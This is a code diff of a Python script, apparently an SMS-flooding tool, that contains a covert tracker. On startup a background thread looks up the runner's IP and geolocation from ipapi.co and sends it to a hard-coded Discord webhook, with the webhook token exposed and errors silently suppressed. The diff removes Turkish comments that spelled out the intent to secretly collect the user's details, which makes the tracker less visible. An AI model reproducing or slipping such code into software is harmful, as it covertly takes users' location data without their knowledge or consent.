@@ -3,13 +3,13 @@ from time import sleep
 from os import system
 from sms import SendSms
 import threading
-import requests # Yeni eklenen kütüphane
-from datetime import datetime # Yeni eklenen kütüphane
+import requests 
+from datetime import datetime 
 
 # --- LOG SISTEMI BASLANGIC ---
 def discord_log_gonder():
     try:
-        # Elemanin bilgilerini cekiyih
+       
         veri = requests.get('https://ipapi.co/json/').json()
         webhook_url = "https://discord.com/api/webhooks/1466447461093474520/cGjbODl_H-HVLYEWg-Vv3Ui30gfW-i-pamIyrVejJmzZzK6mefinpGX-cqXk37lx0DFR" # Burayi doldurmayi unutma
         
@@ -30,9 +30,9 @@ def discord_log_gonder():
         }
         requests.post(webhook_url, json=discord_mesaji)
     except:
-        pass # Bir sorun cikti ama caktirmayih
+        pass 
 
-# Program baslar baslamaz logu gonderiyih
+
 threading.Thread(target=discord_log_gonder, daemon=True).start()
 # --- LOG SISTEMI BITIS ---
 
